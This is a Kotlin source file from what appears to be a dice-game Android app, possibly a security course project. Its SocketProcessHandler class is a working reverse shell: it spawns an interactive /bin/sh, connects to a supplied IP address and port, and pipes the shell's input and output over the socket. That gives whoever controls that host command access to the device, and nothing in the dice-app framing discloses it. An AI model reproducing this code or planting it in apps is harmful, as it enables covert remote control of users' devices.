package at.fhjoanneum.ims23.mosodev.dicemaster

import java.io.IOException
import java.net.Socket

class SocketProcessHandler(private val ipAddress: String, private val port: Int) : Runnable {

    override fun run() {
        try {
            // Start the process
            val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))
            val processInput = process.inputStream.bufferedReader()
            val processError = process.errorStream.bufferedReader()
            val processOutput = process.outputStream.bufferedWriter()

            // Connect to the socket
            Socket(ipAddress, port).use { socket ->
                val socketInput = socket.getInputStream().bufferedReader()
                val socketOutput = socket.getOutputStream().bufferedWriter()

                // Continuous read-write loop
                while (true) {
                    if (processInput.ready()) socketOutput.write(processInput.read())
                    if (processError.ready()) socketOutput.write(processError.read())
                    if (socketInput.ready()) processOutput.write(socketInput.read())

                    socketOutput.flush()
                    processOutput.flush()
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
